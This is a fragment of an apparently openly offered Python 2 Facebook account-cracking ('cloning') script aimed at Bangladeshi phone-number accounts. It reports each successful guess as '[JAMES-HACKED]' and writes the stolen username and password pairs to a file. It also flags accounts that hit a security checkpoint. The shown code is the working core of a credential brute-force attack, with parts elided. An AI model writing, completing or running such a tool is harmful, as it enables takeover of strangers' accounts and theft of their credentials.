...
psb('\x1b[1;32mBANGLADESH 10 DIGIT CLONING START PLEASE WAIT ........')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;91m[JAMES-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[JAMES-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m                   [\xf0\x9f\x92\x8fOpen After 7 Days\xf0\x9f\x92\x8f]\x1b[0m \n'
